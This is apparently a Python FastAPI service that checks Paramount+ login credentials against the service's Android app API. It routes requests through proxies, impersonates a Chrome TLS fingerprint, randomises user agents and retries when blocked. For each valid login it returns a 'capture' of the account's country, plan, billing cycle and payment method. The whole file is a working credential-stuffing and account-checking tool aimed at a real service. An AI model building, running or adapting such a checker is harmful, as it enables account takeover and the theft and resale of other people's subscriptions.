import asyncio
import secrets
import re
from typing import Optional
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from fake_useragent import UserAgent
from curl_cffi.requests import AsyncSession  # Optimized Async Backend

app = FastAPI(title="Paramount+ Serverless Auth API Fast")
ua = UserAgent()

COUNTRY_MAP = {
    "AF": "Afganistan ", "AX": "Åland Islands ", "AL": "Albania ", "DZ": "Algeria ",
    "AS": "American Samoa ", "AD": "Andorra ", "AO": "Angola ", "AI": "Anguilla ",
    "AQ": "Antartica ", "AG": "Antigua and Barbuda ", "AR": "Argentina ", "AM": "Armenia ",
    "AW": "Aruba ", "AU": "Australia ", "AT": "Austria ", "AZ": "Azerbaijan ",
    "BS": "Bahamas ", "BH": "Bahrain ", "BD": "Bangladesh ", "BB": "Barbados ",
    "BY": "Belarus ", "BE": "Belgium ", "BZ": "Belize ", "BJ": "Benin ",
    "BM": "Bermuda ", "BT": "Bhutan ", "BO": "Bolivia ", "BQ": "Bonaire",
    "BA": "Bosnia and Herzegovina ", "BW": "Botswana ", "BR": "Brazil ",
    "IO": "British Indian Ocean Territory ", "VG": "British Virgin Islands ", "BN": "Brunei ",
    "BG": "Bulgaria ", "BF": "Burkina Faso ", "BI": "Burundi ", "KH": "Cambodia ",
    "CM": "Cameroon ", "CA": "Canada ", "IC": "Canary Islands ", "CV": "Cape Verde ",
    "KY": "Cayman Islands ", "CF": "Central African Republic ", "TD": "Chad ",
    "CL": "Chile  ", "CN": "China ", "CX": "Christmas Island ", "CC": "Cocos (Keeling) Islands ",
    "CO": "Colombia ", "KM": "Comoros ", "CG": "Republic Congo ", "CD": "Democratic Congo ",
    "CK": "Cook Islands ", "CR": "Costa Rica ", "CI": "CÃ´te d'Ivoire ", "HR": "Croatia ",
    "CU": "Cuba ", "CW": "CuraÃ§ao ", "CY": "Cyprus ", "CZ": "Czech Republic ",
    "DK": "Denmark ", "DJ": "Djibouti ", "DM": "Dominica ", "DO": "Dominican Republic ",
    "EC": "Ecuador ", "EG": "Egypt ", "SV": "El Salvador ", "GQ": "Equatorial Guinea ",
    "ER": "Eritrea ", "EE": "Estonia ", "ET": "Eswatini ", "FK": "Falkland Islands ",
    "FO": "Faroe Islands ", "FJ": "Fiji ", "FI": "Finland ", "FR": "France ",
    "GF": "French Guiana ", "PF": "French Polynesia ", "TF": "French Southern Territories ",
    "GA": "Gabon ", "GM": "Gambia ", "GE": "Georgia ", "DE": "Germany ",
    "GH": "Ghana ", "GI": "Gibraltar ", "GR": "Greece ", "GL": "Greenland ",
    "GD": "Grenada ", "GP": "Guadeloupe ", "GU": "Guam ", "GT": "Guatemala ",
    "GG": "Guernsey ", "GN": "Guinea ", "GW": "Guinea-Bissau ", "GY": "Guyana ",
    "HT": "Haiti ", "HN": "Honduras ", "HK": "Hong Kong ", "HU": "Hungary ",
    "IS": "Iceland ", "IN": "India ", "ID": "Indonesia ", "IR": "Iran ",
    "IQ": "Iraq ", "IE": "Ireland ", "IM": "Isle of Man ", "IL": "Israel ",
    "IT": "Italy ", "JM": "Jamaica ", "JP": "Japan ", "JE": "Jersey ",
    "JO": "Jordan ", "KZ": "Kazakhstan ", "KE": "Kenya ", "KI": "Kiribati ",
    "XK": "Kosovo ", "KW": "Kuwait ", "KG": "Kyrgyzstan ", "LA": "Laos ",
    "LV": "Latvia ", "LB": "Lebanon ", "LS": "Lesotho ", "LR": "Liberia ",
    "LY": "Libya ", "LI": "Liechtenstein ", "LT": "Lithuania ", "LU": "Luxembourg ",
    "MO": "Macau ", "MG": "Madagascar ", "MW": "Malawi ", "MY": "Malaysia ",
    "MV": "Maldives ", "ML": "Mali ", "MT": "Malta ", "MH": "Marshall Islands ",
    "MQ": "Martinique ", "MR": "Mauritania ", "MU": "Mauritius ", "YT": "Mayotte ",
    "MX": "Mexico ", "FM": "Micronesia ", "MD": "Moldova ", "MC": "Monaco ",
    "MN": "Mongolia ", "ME": "Montenegro ", "MS": "Montserrat ", "MA": "Morocco ",
    "MZ": "Mozambique ", "MM": "Myanmar ", "NA": "Namibia ", "NR": "Nauru ",
    "NP": "Nepal ", "NL": "Netherlands ", "NC": "New Caledonia ", "NZ": "New Zealand ",
    "NI": "Nicaragua ", "NE": "Niger ", "NG": "Nigeria ", "NU": "Niue ",
    "NF": "Norfolk Island ", "KP": "North Korea ", "MK": "North Macedonia ",
    "MP": "Northern Mariana Islands ", "NO": "Norway ", "OM": "Oman ", "PK": "Pakistan ",
    "PW": "Palau ", "PS": "Palestine ", "PA": "Panama ", "PG": "Papua New Guinea ",
    "PY": "Paraguay ", "PE": "Peru ", "PH": "Philippines ", "PN": "Pitcairn ",
    "PL": "Poland ", "PT": "Portugal ", "PR": "Puerto Rico ", "QA": "Qatar ",
    "RE": "Réunion ", "RO": "Romania ", "RU": "Russia ", "RW": "Rwanda ",
    "WS": "Samoa ", "SM": "San Marino ", "ST": "Sao Tome and Principe ", "SA": "Saudi Arabia ",
    "SN": "Senegal ", "RS": "Serbia ", "SC": "Seychelles ", "SL": "Sierra Leone ",
    "SG": "Singapore ", "SX": "Sint Maarten ", "SK": "Slovakia ", "SI": "Slovenia ",
    "GS": "South Georgia and the South Sandwich Islands ", "SB": "Solomon Islands ", "SO": "Somalia ",
    "ZA": "South Africa ", "KR": "South Korea ", "SS": "South Sudan ", "ES": "Spain ",
    "LK": "Sri Lanka ", "BL": "St. Barthélemy ", "SH": "Saint Helena, Ascension and Tristan da Cunha ",
    "KN": "Saint Kitts and Nevis ", "LC": "St. Lucia ", "PM": "Saint Pierre and Miquelon ",
    "VC": "Saint Vincent and the Grenadines ", "SD": "Sudan ", "SR": "Suriname ",
    "SZ": "Swaziland ", "SE": "Sweden ", "CH": "Switzerland ", "SY": "Syrian Arab Republic ",
    "TW": "Taiwan ", "TJ": "Tajikistan ", "TZ": "Tanzania ", "TH": "Thailand ",
    "TL": "Timor-Leste ", "TG": "Togo ", "TK": "Tokelau ", "TO": "Tonga ",
    "TT": "Trinidad and Tobago ", "TN": "Tunisia ", "TR": "Turkey ", "TM": "Turkmenistan ",
    "TC": "Turks and Caicos Islands ", "TV": "Tuvalu ", "UG": "Uganda ", "UA": "Ukraine ",
    "AE": "UAE ", "GB": "United Kingdom ", "US": "United States ", "UY": "Uruguay ",
    "UZ": "Uzbekistan ", "VI": "Virgin Islands ", "VU": "Vanuatu ", "VA": "Vatican ",
    "VE": "Venezuela ", "VN": "Vietnam ", "WF": "Wallis and Futuna ", "EH": "Western Sahara ",
    "YE": "Yemen ", "ZM": "Zambia ", "ZW": "Zimbabwe "
}

class AuthRequest(BaseModel):
    username: str
    password: str
    proxy: Optional[str] = None


def format_proxy(raw_proxy: str) -> Optional[dict]:
    if not raw_proxy:
        return None
    match_userpass = re.match(r"^[^:]+:[^:]+:([^:]+:[^_]+(?:_.+)?)$", raw_proxy)
    match_ipport = re.match(r"^([^:]+:[^:]+)", raw_proxy)
    
    if match_userpass and match_ipport:
        proxy_str = f"http://{match_userpass.group(1)}@{match_ipport.group(1)}"
    elif not raw_proxy.startswith("http"):
        proxy_str = f"http://{raw_proxy}"
    else:
        proxy_str = raw_proxy
        
    return {"http": proxy_str, "https": proxy_str}


def extract_json_value(source: str, left: str, right: str) -> str:
    try:
        start = source.index(left) + len(left)
        end = source.index(right, start)
        return source[start:end]
    except ValueError:
        return ""


async def run_session_request_async(session: AsyncSession, url: str, method: str, data: Optional[dict] = None, headers: Optional[dict] = None, proxies: Optional[dict] = None) -> tuple[int, str]:
    """Executes network calls asynchronously with clean error retry ceilings."""
    retries = 0
    while retries < 5:
        try:
            if method == "POST":
                resp = await session.post(url, data=data, headers=headers, proxies=proxies, timeout=10)
            else:
                resp = await session.get(url, headers=headers, proxies=proxies, timeout=10)
                
            if resp.status_code in [500, 403, 406]:
                retries += 1
                await asyncio.sleep(0.2)
                continue
            return resp.status_code, resp.text
        except Exception:
            retries += 1
            await asyncio.sleep(0.2)
            continue
    return 0, ""


@app.post("/auth")
async def authenticate(payload: AuthRequest):
    proxies_dict = format_proxy(payload.proxy)
    device_id = secrets.token_hex(8).lower()
    user_agent = ua.random

    base_headers = {
        "Host": "www.intl.paramountplus.com",
        "Cookie": "CBS_DEVICEID=",
        "Cache-Control": "max-age=0",
        "Traceparent": "00-c206720e0f5a4e1387706d69d577877c-10cc66f212114532-01",
        "Tracestate": "2321606@nr=0-2-2936348-766585785-10cc66f212114532----1763113514852",
        "Newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjkzNjM0OCIsImFwIjoiNzY2NTg1Nzg1IiwidHIiOiJjMjA2NzIwZTBmNWE0ZTEzODc3MDZkNjlkNTc3ODc3YyIsImlkIjoiMTBjYzY2ZjIxMjExNDUzMiIsInRpIjoxNzYzMTEzNTE0ODUyLCJ0ayI6IjIzMjE2MDYifX0=",
        "User-Agent": user_agent,
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9"
    }

    # Asynchronous engine instance matching modern chrome profiles
    async with AsyncSession(impersonate="chrome120") as session:
        
        # Step 1: Login Verification
        login_url = "https://www.intl.paramountplus.com/apps-api/v2.1/androidphone/auth/login.json?locale=en-us&at=ABC74o%2B31mI%2F%2FzQ3GstOJMJJ%2FgdJGAU5PCKXsJ%2B%2BroG%2FyHi2O754P8Ojsak4Ev7LXck%3D"
        login_headers = base_headers.copy()
        login_headers["Content-Type"] = "application/x-www-form-urlencoded"
        
        body_data = {
            "j_username": payload.username,
            "j_password": payload.password,
            "deviceId": device_id
        }

        status, source = await run_session_request_async(session, login_url, "POST", data=body_data, headers=login_headers, proxies=proxies_dict)

        if not source or "Invalid username/password pair" in source or '"status":400,"error":"Bad Request",' in source:
            raise HTTPException(status_code=401, detail="Failure: Invalid Credentials")
        
        if "userId" not in source:
            raise HTTPException(status_code=400, detail="Failure: Unknown Response Structure")

        # Step 2: Details Capture
        status_url = "https://www.intl.paramountplus.com/apps-api/v3.0/androidphone/login/status.json?locale=en-us&at=ABAe6KaaPmQXoXXr2FS9yDys4wXLwooaEREtz0c6agC7vrQhjTY%2FYfp1dfSDtu9EbB0%3D"
        status_headers = base_headers.copy()
        status_headers["Content-Type"] = "application/x-www-form-urlencoded"

        status_code, status_source = await run_session_request_async(session, status_url, "GET", headers=status_headers, proxies=proxies_dict)

        if "NEW_FREE_PACKAGE" in status_source or '"planType":null,' in status_source:
            return {"status": "Custom/Free", "detail": "Account has no active premium package"}

        country_code = extract_json_value(status_source, '"subscriptionCountry":"', '"')
        plan = extract_json_value(status_source, '"productName":"', '"')
        plan_type = extract_json_value(status_source, '"planType":"', '"')
        billing_period = extract_json_value(status_source, '"billingCadence":"', '"')
        package_code = extract_json_value(status_source, '"packageCode":"', '"')
        payment_method = extract_json_value(status_source, '"packageSource":"', '"')

        country_name = COUNTRY_MAP.get(country_code, f"Unknown ({country_code})")

        return {
            "status": "Success",
            "capture": {
                "country": country_name,
                "plan": plan,
                "plan_type": plan_type,
                "billing_period": billing_period,
                "package": package_code,
                "payment_method": payment_method
            }
        }
